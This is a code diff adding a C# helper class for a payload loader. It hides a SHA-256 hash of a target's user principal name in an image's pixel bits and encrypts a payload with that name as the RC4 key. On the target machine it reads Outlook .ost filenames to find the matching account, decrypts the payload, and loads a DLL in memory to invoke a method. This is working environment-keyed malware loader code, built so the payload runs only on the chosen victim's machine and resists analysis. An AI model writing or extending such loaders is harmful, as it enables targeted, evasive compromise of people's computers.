@@ -4,8 +4,180 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
+
+public static class SteganographyHelper
+{
+    public static void HideUPNInImage(string imageFilePath, string upn)
+    {
+        // Hash the UPN
+        string hashString = GetSha256Hash(upn);
+
+        // Convert the hash string to bytes
+        byte[] hashBytes = Encoding.UTF8.GetBytes(hashString); // Use the full hash string
+        int hashByteIndex = 0;
+        int hashBitIndex = 0;
+
+        Bitmap bitmap = new Bitmap(imageFilePath);
+
+        for (int y = 0; y < bitmap.Height; y++)
+        {
+            for (int x = 0; x < bitmap.Width; x++)
+            {
+                if (hashByteIndex >= hashBytes.Length)
+                {
+                    // All hash bytes have been hidden
+                    string newImageFilePath = Path.Combine(Path.GetDirectoryName(imageFilePath), Path.GetFileNameWithoutExtension(imageFilePath) + "_copy" + Path.GetExtension(imageFilePath));
+                    bitmap.Save(newImageFilePath, ImageFormat.Png);
+                    return;
+                }
+
+                Color pixelColor = bitmap.GetPixel(x, y);
+
+                // Modify the least significant bit of the blue channel
+                byte blue = pixelColor.B;
+                blue = (byte)((blue & 0xFE) | ((hashBytes[hashByteIndex] >> hashBitIndex) & 1));
+
+                Color newPixelColor = Color.FromArgb(pixelColor.R, pixelColor.G, blue);
+                bitmap.SetPixel(x, y, newPixelColor);
+
+                hashBitIndex++;
+                if (hashBitIndex == 8)
+                {
+                    hashBitIndex = 0;
+                    hashByteIndex++;
+                }
+            }
+        }
+
+        // Save the modified image
+        string finalImageFilePath = Path.Combine(Path.GetDirectoryName(imageFilePath), Path.GetFileNameWithoutExtension(imageFilePath) + "_copy" + Path.GetExtension(imageFilePath));
+        bitmap.Save(finalImageFilePath, ImageFormat.Png);
+    }
+    public static void UPNEncrypt(string inputFilePath, string imageFilePath, string upn)
+    {
+        // Hash the UPN
+        string hashedUPN = SteganographyHelper.GetSha256Hash(upn);
+
+        // Hide the hashed UPN in the image
+        SteganographyHelper.HideUPNInImage(imageFilePath, upn);
+        Console.WriteLine($"UPN: {upn} has been hashed and hidden in {imageFilePath}");
+        Console.WriteLine($"Hashed UPN: {hashedUPN}");
+
+        // Encrypt the file and base64 encode the result into mod.txt
+        Encrypt.ExEncrypt(inputFilePath, upn);
+    }
+
+    public static void UPNDecrypt(string imageFilePath, string loadMethodSignature)
+    {
+        // Extract the hashed UPN from the image
+        string extractedHash = RetrieveUPNFromImage(imageFilePath);
+        Console.WriteLine($"Extracted Hash: {extractedHash}");
+
+        // Read the base64 encoded encrypted data from mod.txt
+        string base64Encrypted = File.ReadAllText("mod.txt");
+        byte[] encryptedBytes = Convert.FromBase64String(base64Encrypted);
+
+        // List all accounts and check for matching hash
+        string outlookFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Outlook");
+        if (!Directory.Exists(outlookFolder))
+        {
+            Console.WriteLine("Outlook directory not found.");
+            return;
+        }
+
+        string[] ostFiles = Directory.GetFiles(outlookFolder, "*.ost");
+        if (ostFiles.Length == 0)
+        {
+            Console.WriteLine("No .ost files found in the Outlook directory.");
+            return;
+        }
+
+        foreach (string ostFile in ostFiles)
+        {
+            string upn = Path.GetFileNameWithoutExtension(ostFile);
+            string hashedUpn = GetSha256Hash(upn);
+
+            if (hashedUpn.StartsWith(extractedHash))
+            {
+                // Decrypt the data using the hashed UPN as the key
+                byte[] keyBytes = Encoding.ASCII.GetBytes(upn);
+                byte[] decryptedBytes = new byte[encryptedBytes.Length];
+                Encrypt.RC4EncryptDecrypt(keyBytes, encryptedBytes, decryptedBytes);
+
+                // Load the DLL from the decrypted bytes in memory and invoke the specified method
+                try
+                {
+                    Load.InvokeMethodFromDecryptedData(decryptedBytes, loadMethodSignature);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error invoking method: {ex.Message}");
+                }
+                return;
+            }
+        }
+
+        Console.WriteLine("Failed to find a matching UPN hash.");
+    }
+
+
+    public static string RetrieveUPNFromImage(string imageFilePath)
+    {
+        Bitmap bitmap = new Bitmap(imageFilePath);
+        byte[] hashBytes = new byte[64]; // Adjust the size to match the full hash length in characters
+        int hashByteIndex = 0;
+        int hashBitIndex = 0;
+
+        for (int y = 0; y < bitmap.Height; y++)
+        {
+            for (int x = 0; x < bitmap.Width; x++)
+            {
+                if (hashByteIndex >= hashBytes.Length)
+                {
+                    // All hash bytes have been retrieved
+                    return Encoding.UTF8.GetString(hashBytes); // Return as string
+                }
+
+                Color pixelColor = bitmap.GetPixel(x, y);
+
+                // Extract the least significant bit of the blue channel
+                byte blue = pixelColor.B;
+                hashBytes[hashByteIndex] |= (byte)((blue & 1) << hashBitIndex);
+
+                hashBitIndex++;
+                if (hashBitIndex == 8)
+                {
+                    hashBitIndex = 0;
+                    hashByteIndex++;
+                }
+            }
+        }
+
+        // If the loop completes without returning, return the retrieved hash
+        return Encoding.UTF8.GetString(hashBytes); // Return as string
+    }
+
+    public static string GetSha256Hash(string rawData)
+    {
+        // Create a SHA256
+        using (SHA256 sha256Hash = SHA256.Create())
+        {
+            // ComputeHash - returns byte array
+            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
+
+            // Convert byte array to a string
+            StringBuilder builder = new StringBuilder();
+            for (int i = 0; i < bytes.Length; i++)
+            {
+                builder.Append(bytes[i].ToString("x2"));
+            }
+            return builder.ToString();
+        }
+    }
+}
 public static class Steg
 {
     public static void ExStegDecrypt(string imageFilePath, string loadMethodSignature = null)
